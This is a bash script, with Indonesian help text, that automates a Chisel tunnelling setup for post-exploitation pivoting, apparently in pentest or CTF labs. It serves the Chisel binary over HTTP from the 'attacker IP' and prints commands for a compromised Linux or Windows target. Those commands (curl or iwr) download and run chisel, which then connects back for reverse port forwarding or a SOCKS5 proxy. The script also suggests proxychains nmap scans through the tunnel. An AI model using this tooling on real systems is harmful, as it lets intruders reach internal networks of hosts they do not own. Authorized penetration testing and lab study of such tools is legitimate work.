#!/bin/bash

# =========================
# DEFAULT CONFIGURATION
# =========================
CHISEL_DIR="/opt/postexploitation/chisel"
PORT="9001"
WEBPORT="8000"
FORWARD_SPEC=""
MODE="direct"

# =========================
# HELPER / USAGE FUNCTION
# =========================
show_help() {
    cat << EOF
Usage: $(basename "$0") [OPTIONS]

Script helper otomatis untuk menjalankan Chisel Server, mempersiapkan command target, 
serta menampilkan instruksi pengujian selanjutnya (Next Test Commands).

OPTIONS:
  -p, --port PORT         Port listening untuk Chisel Server (Default: 9001)
  -w, --webport PORT      Port HTTP server untuk hosting binary Chisel (Default: 8000)
  -f, --forward SPEC      Target port forwarding untuk mode DIRECT (Tanpa Proxychains).
                          Contoh singkat: "8000" (otomatis R:8000:127.0.0.1:8000)
                          Contoh custom  : "R:8080:10.10.10.5:80"
  -s, --socks             Gunakan mode SOCKS5 Proxy (Butuh Proxychains / Browser SOCKS)
  -d, --dir PATH          Direktori tempat binary chisel disimpan (Default: /opt/postexploitation/chisel)
  -h, --help              Tampilkan pesan bantuan ini

PERBEDAAN MODE & PROXYCHAINS:
  1. Mode DIRECT (-f / --forward):
     - TIDAK PERLU proxychains.
     - Port target langsung di-mapping ke localhost Kali.
     - Pengujian langsung via 'curl http://127.0.0.1:<PORT>' atau browser.

  2. Mode SOCKS5 (-s / --socks):
     - PERLU proxychains / FoxyProxy.
     - Membuka SOCKS5 proxy server di localhost Kali (default port 1080).
     - Pengujian dilakukan via 'proxychains <command>'.

EXAMPLES:
  1. Port forward 8000 (Direct Forward - Tanpa Proxychains):
     ./$(basename "$0") -f 8000

  2. Mode SOCKS5 Proxy (Pivoting - Menggunakan Proxychains):
     ./$(basename "$0") -s

  3. Custom Forward Port & Chisel Server Port:
     ./$(basename "$0") -p 4444 -f 8080

EOF
    exit 0
}

# =========================
# PARSE ARGUMENTS
# =========================
while [[ $# -gt 0 ]]; do
    case "$1" in
        -p|--port)
            PORT="$2"
            shift 2
            ;;
        -w|--webport)
            WEBPORT="$2"
            shift 2
            ;;
        -f|--forward)
            FORWARD_SPEC="$2"
            shift 2
            ;;
        -s|--socks)
            MODE="socks"
            shift
            ;;
        -d|--dir)
            CHISEL_DIR="$2"
            shift 2
            ;;
        -h|--help)
            show_help
            ;;
        *)
            echo "[!] Unknown option: $1"
            echo "Gunakan -h atau --help untuk melihat instruksi."
            exit 1
            ;;
    esac
done

# =========================
# DETECT IP ATTACKER
# =========================
IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
[ -z "$IP" ] && IP=$(hostname -I | awk '{print $1}')

echo "========================================================="
echo "                CHISEL AUTO-LAUNCHER                     "
echo "========================================================="
echo "[+] Attacker IP : $IP"
echo "[+] Chisel Port : $PORT"
echo "[+] Web Server  : $WEBPORT"

# Format string parameter untuk client
if [ "$MODE" == "socks" ]; then
    CLIENT_PARAM="R:socks"
    echo "[+] Mode        : SOCKS5 Proxy (MEMBUTEHKAN Proxychains)"
else
    if [ -z "$FORWARD_SPEC" ]; then
        echo "[!] Peringatan: Tidak ada -f (forward) atau -s (socks) yang ditentukan."
        echo "[!] Defaulting ke SOCKS5 Mode (R:socks)..."
        CLIENT_PARAM="R:socks"
        MODE="socks"
    elif [[ "$FORWARD_SPEC" =~ ^[0-9]+$ ]]; then
        CLIENT_PARAM="R:${FORWARD_SPEC}:127.0.0.1:${FORWARD_SPEC}"
        echo "[+] Mode        : Direct Forwarding (TANPA Proxychains - Port $FORWARD_SPEC)"
    else
        CLIENT_PARAM="$FORWARD_SPEC"
        echo "[+] Mode        : Custom Direct Forwarding (TANPA Proxychains - $FORWARD_SPEC)"
    fi
fi

# =========================
# START WEBSERVER
# =========================
echo ""
echo "[+] Starting HTTP Server di port :$WEBPORT dari direktori $CHISEL_DIR..."

# Matikan proses python lama jika port 8000 masih menggantung
fuser -k ${WEBPORT}/tcp >/dev/null 2>&1

# Jalankan Python server dengan argumen --directory agar langsung menyajikan isi folder /opt/postexploitation/chisel
python3 -m http.server "$WEBPORT" --directory "$CHISEL_DIR" >/dev/null 2>&1 &

# =========================
# PRINT TARGET COMMANDS
# =========================
echo ""
echo "---------------------------------------------------------"
echo " RUN ON TARGET (Linux):"
echo "---------------------------------------------------------"
echo "curl -sSO http://$IP:$WEBPORT/chisel && chmod +x chisel"
echo "./chisel client $IP:$PORT $CLIENT_PARAM &"
echo "---------------------------------------------------------"

echo ""
echo "---------------------------------------------------------"
echo " RUN ON TARGET (Windows):"
echo "---------------------------------------------------------"
echo "iwr http://$IP:$WEBPORT/chisel.exe -OutFile chisel.exe"
echo ".\\chisel.exe client $IP:$PORT $CLIENT_PARAM"
echo "---------------------------------------------------------"

# =========================
# NEXT TEST SUGGESTIONS
# =========================
echo ""
echo "========================================================="
echo " NEXT TEST COMMANDS (Eksekusi dari Kali setelah terhubung):"
echo "========================================================="

if [ "$MODE" == "socks" ]; then
    echo "[!] INFO: Mode SOCKS5 aktif. PERLU menambahkan 'proxychains' sebelum perintah."
    echo ""
    echo " 1. Web Testing (CURL):"
    echo "    proxychains curl -i http://127.0.0.1:8000"
    echo ""
    echo " 2. Port Scanning / Service Enumeration (Nmap TCP Connect Scan) (gak bisa SYN scans, full sweeps through a tunnel are painfully slow):"
    echo "    proxychains nmap -sT -Pn -p 80,443,8000,8080 127.0.0.1"
    echo ""
    echo " 3. Web Browser Access:"
    echo "    Buka browser via proxychains: proxychains firefox http://127.0.0.1:8000"
    echo "    (Atau atur SOCKS5 Proxy di FoxyProxy ke 127.0.0.1:1080)"
else
    TARGET_PORT="${FORWARD_SPEC:-8000}"
    echo "[!] INFO: Mode Direct Forwarding aktif. TANPA proxychains, panggil port langsung."
    echo ""
    echo " 1. Web Testing (CURL):"
    echo "    curl -i http://127.0.0.1:$TARGET_PORT"
    echo ""
    echo " 2. Port Scanning / Service Enumeration (Nmap Direct Scan):"
    echo "    nmap -sV -sC -p $TARGET_PORT 127.0.0.1"
    echo ""
    echo " 3. Web Browser Access:"
    echo "    Buka langsung di browser Kali: http://127.0.0.1:$TARGET_PORT"
fi
echo "========================================================="

echo ""
read -p "[*] Tekan ENTER untuk menjalankan Chisel Server..."
echo ""

# =========================
# START CHISEL SERVER
# =========================
cd "$CHISEL_DIR" || exit
/usr/bin/chisel server -p "$PORT" --reverse
